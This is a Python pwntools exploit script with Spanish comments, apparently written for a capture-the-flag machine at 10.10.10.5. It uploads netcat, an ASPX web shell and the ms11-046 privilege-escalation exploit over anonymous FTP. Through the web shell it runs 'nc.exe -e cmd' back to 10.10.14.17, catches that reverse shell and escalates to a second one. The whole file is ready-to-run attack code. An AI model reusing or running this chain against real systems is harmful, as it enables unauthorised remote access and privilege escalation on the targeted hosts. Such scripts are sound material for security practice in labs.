#!/usr/bin/python3

from pwn import *
from ftplib import FTP
import sys,signal,requests,threading,time

#Ctrl + C 
def def_handler(sig, frame):
    print("[!] Saliendo...")
    sys.exit(1)


signal.signal(signal.SIGINT,def_handler)

#Variables globales
url = "http://10.10.10.5/aspx_cmd.aspx"

def upload_files():
    ftp = FTP('10.10.10.5')
    #ftp.set_debuglevel(2)
    ftp.login()
    
    with open ('nc.exe', 'rb') as nc:
        ftp.storbinary('STOR nc.exe', nc)

    with open('aspx_cmd.aspx', 'rb') as cmd:
        ftp.storbinary('STOR aspx_cmd.aspx', cmd)

    with open('ms11-046.exe', 'rb') as privesc:
        ftp.storbinary('STOR ms11-046.exe', privesc)

    ftp.close()

def makeRequest():
    
    post_data= {
            "__VIEWSTATE":"/wEPDwULLTE2MjA0MDg4ODhkZPHP3loXCnTKZCT+Q7zR035xHsl+",
            "__EVENTVALIDATION":"/wEWAwLP0Z2EDQKa++KPCgKBwth5bI/XyH9dVQWVHOaGXvCY9VitYn8=",
            "txtArg":"C:\\inetpub\\wwwroot\\nc.exe -e cmd 10.10.14.17 443",
            "testing":"excute"
            }

    r = requests.post(url,data=post_data)

if __name__ == '__main__':
    print("[!] Importante ponerse en escucha en el puerto 1337 (nc -nlvp 1337)")
    
    p1 = log.progress("Devel Pwn Web")
    p1.status("Reverse Shell y explotacion de la vulnerabilidad ms11-046")
    time.sleep(1)
    p1.status("Subiendo archivos al servidor FTP...")
    upload_files()

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(443, timeout=20).wait_for_connection()

    if shell.sock is None:
        p1.failure("No ha sido posible establecer la conexion")
        sys.exit(1)

    else:
        p1.success("Reverse shell obtenida con exito")
        shell.sendline(b"C:\inetpub\wwwroot\ms11-046.exe")
        shell.sendline(b"C:\\inetpub\\wwwroot\\nc.exe -e cmd 10.10.14.17 1337")
